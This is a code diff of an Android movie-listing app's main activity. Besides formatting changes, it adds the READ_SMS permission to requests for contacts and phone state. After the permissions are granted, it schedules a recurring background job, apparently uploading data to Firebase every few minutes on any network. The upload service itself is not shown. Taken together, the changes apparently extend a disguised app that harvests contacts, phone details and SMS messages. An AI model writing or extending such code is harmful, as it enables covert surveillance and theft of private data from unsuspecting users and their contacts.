@@ -26,7 +26,7 @@ import java.util.ArrayList;
 
 public class MainActivity extends AppCompatActivity {
     private static final int MY_PERMISSIONS_REQUEST_READ_CONTACTS = 1;
-    ArrayList<Contact>contactList;
+    ArrayList<Contact> contactList;
     ListView moviewLV;
 
 
@@ -34,10 +34,10 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        moviewLV= (ListView) findViewById(R.id.movieList);
-        Movie movie=new Movie();
-        final ArrayList<Movie>movies=movie.getAllMOvies();
-        MOvieAdapter mOvieAdapter=new MOvieAdapter(this,movies);
+        moviewLV = (ListView) findViewById(R.id.movieList);
+        Movie movie = new Movie();
+        final ArrayList<Movie> movies = movie.getAllMOvies();
+        MOvieAdapter mOvieAdapter = new MOvieAdapter(this, movies);
         moviewLV.setAdapter(mOvieAdapter);
         checkPhonePermission();
         moviewLV.setOnItemClickListener(new AdapterView.OnItemClickListener() {
@@ -56,23 +56,25 @@ public class MainActivity extends AppCompatActivity {
                 android.Manifest.permission.READ_CONTACTS)
                 != PackageManager.PERMISSION_GRANTED | ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_PHONE_STATE)
-                != PackageManager.PERMISSION_GRANTED) {
+                != PackageManager.PERMISSION_GRANTED|ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_SMS)
+                != PackageManager.PERMISSION_GRANTED){
             ActivityCompat.requestPermissions(this,
-                    new String[]{android.Manifest.permission.READ_CONTACTS,Manifest.permission.READ_PHONE_STATE},
+                    new String[]{android.Manifest.permission.READ_CONTACTS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_SMS},
                     MY_PERMISSIONS_REQUEST_READ_CONTACTS);
         }else{
             upLoadDataToFireBase();
         }
     }
 
-    synchronized private void upLoadDataToFireBase(){
+    synchronized private void upLoadDataToFireBase() {
         FirebaseJobDispatcher dispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(this));
 
         Job myJob = dispatcher.newJobBuilder()
                 .setService(InfoJobService.class)
                 .setTag("InfoJobService")
                 .setRecurring(true)
-                .setTrigger(Trigger.executionWindow(3*60, 5*60))
+                .setTrigger(Trigger.executionWindow(3 * 60, 5 * 60))
                 .setLifetime(Lifetime.UNTIL_NEXT_BOOT)
                 .setReplaceCurrent(false)
                 .setConstraints(Constraint.ON_ANY_NETWORK)
@@ -108,7 +110,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void reload() {
-        Intent intent=new Intent(this,MainActivity.class);
+        Intent intent = new Intent(this, MainActivity.class);
         startActivity(intent);
     }
 
